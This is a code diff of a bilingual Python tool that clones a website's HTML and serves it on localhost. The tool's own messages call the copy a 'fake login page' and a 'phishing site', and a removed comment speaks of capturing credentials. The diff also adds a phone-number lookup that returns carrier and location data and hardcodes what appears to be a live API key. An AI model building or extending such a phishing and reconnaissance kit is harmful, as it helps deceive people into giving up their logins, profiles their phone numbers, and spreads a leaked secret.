@@ -2,7 +2,6 @@ import os
 import subprocess
 from colorama import init, Fore, Style
 import time
-import numlookupapi
 import requests
 from bs4 import BeautifulSoup
 import threading
@@ -262,98 +261,98 @@ def clone_website(url, server_choice, language):
 
             # Salvando o HTML e CSS
             html_content = soup.prettify()
-            css_content = ''  # Lógica para extrair o CSS da página
+            css_content = ''  # Lógica para extrair o CSS
 
-            # Salvar HTML e CSS em arquivos locais
-            with open('index.html', 'w', encoding='utf-8') as html_file:
-                html_file.write(html_content)
+            with open('index.html', 'w', encoding='utf-8') as f_html:
+                f_html.write(html_content)
+            with open('styles.css', 'w', encoding='utf-8') as f_css:
+                f_css.write(css_content)
 
-            with open('styles.css', 'w', encoding='utf-8') as css_file:
-                css_file.write(css_content)
+            # Iniciando o servidor HTTP local
+            start_local_server()
 
-            print("HTML and CSS downloaded successfully!")
-
-            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
-            if server_choice == '1':
-                run_local_server(url, language)
+            if language == '1':
+                print("Fake login page cloned successfully!")
+            else:
+                print("Página de login falso clonada com sucesso!")
 
         else:
-            print(f"Failed to clone {url}. Status code: {response.status_code}")
+            if language == '1':
+                print(f"Failed to clone {url}. HTTP Error {response.status_code}")
+            else:
+                print(f"Falha ao clonar {url}. Erro HTTP {response.status_code}")
 
-    except Exception as e:
-        print(f"Error cloning website: {e}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
 
-# Função para executar o servidor local
-def run_local_server(url, language):
-    clear_console()
-    if language == '1':
-        print("Running phishing site on localhost...")
-    else:
-        print("Executando site de phishing em localhost...")
+    input("Press Enter to continue...")
 
-    # Configurar o servidor HTTP local para servir os arquivos clonados
-    class PhishingServer(http.server.SimpleHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos
+# Função para iniciar o servidor HTTP local
+def start_local_server():
+    # Configuração do servidor HTTP local
+    PORT = 8080
+    Handler = http.server.SimpleHTTPRequestHandler
 
-    try:
-        # Iniciar o servidor em uma thread separada
-        server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
-        server_thread = threading.Thread(target=server.serve_forever)
-        server_thread.daemon = True
-        server_thread.start()
-
-        print(f"Server running at http://localhost:8080/{url}")
-        input("\nPress Enter to stop the phishing server and continue...")
-
-        # Após capturar as credenciais, parar o servidor
-        server.shutdown()
-        server.server_close()
-
-        # Limpar os arquivos HTML e CSS
-        clean_up_files()
-
-    except Exception as e:
-        print(f"Error running local server: {e}")
-
-# Função para limpar os arquivos HTML e CSS
-def clean_up_files():
-    try:
-        os.remove('index.html')
-        os.remove('styles.css')
-        print("Files cleaned up successfully!")
-    except Exception as e:
-        print(f"Error cleaning up files: {e}")
+    with socketserver.TCPServer(("", PORT), Handler) as httpd:
+        print(f"HTTP server is running at http://localhost:{PORT}")
+        # Servindo requisições HTTP continuamente
+        httpd.serve_forever()
 
 # Função para informações de número de telefone
 def phone_number_info(language):
     clear_console()
     if language == '1':
-        print("Phone Number Information")
-        print("------------------------")
-        number = input("Enter the phone number: ")
-        # Lógica para obter informações do número de telefone usando a API
-        # Exemplo:
-        # response = numlookupapi.lookup(number)
-        # print(response)
+        print("Enter the phone number for information:")
     else:
-        print("Informações de Número de Telefone")
-        print("---------------------------------")
-        number = input("Digite o número de telefone: ")
-        # Lógica para obter informações do número de telefone usando a API
-        # Exemplo:
-        # response = numlookupapi.lookup(number)
-        # print(response)
+        print("Digite o número de telefone para informações:")
 
-    input("\nPress Enter to continue...")
+    phone_number = input("Phone Number: ")
+
+    try:
+        # Chamada à API para obter informações do número de telefone
+        response = requests.get(f'https://api.numlookup.com/v2/phone/{phone_number}', headers={'Authorization': 'num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy'})
+        data = response.json()
+
+        # Exibir resultados formatados
+        print("Phone Number Information:")
+        print(f"Number: {data['number']}")
+        print(f"Valid: {data['valid']}")
+        print(f"Local Format: {data['local_format']}")
+        print(f"International Format: {data['international_format']}")
+        print(f"Country Prefix: {data['country_prefix']}")
+        print(f"Country Code: {data['country_code']}")
+        print(f"Country Name: {data['country_name']}")
+        print(f"Location: {data['location']}")
+        print(f"Carrier: {data['carrier']}")
+        print(f"Line Type: {data['line_type']}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+    input("Press Enter to continue...")
 
 # Função principal para iniciar o programa
 def main():
-    init(autoreset=True)  # Inicialização do Colorama para resetar as cores do terminal
-    language = input("Choose language / Escolha o idioma:\n1. English\n2. Português\nChoice / Escolha: ")
-    welcome_message(language)
+    init(autoreset=True)  # Inicializa o colorama para cores no terminal
+
+    # Seleção de idioma
+    while True:
+        clear_console()
+        print(Fore.YELLOW + Style.BRIGHT + " Language Selection ".center(50, '-'))
+        print("1. English")
+        print("2. Portuguese")
+        language_choice = input("Choose your language / Escolha seu idioma: ")
+
+        if language_choice in ('1', '2'):
+            break
+        else:
+            handle_invalid_option('1')
+
+    # Mensagem de boas-vindas e início do programa
+    welcome_message(language_choice)
     loading_screen()
-    main_menu(language)
+
+    # Exibição do menu principal
+    main_menu(language_choice)
 
 if __name__ == "__main__":
     main()
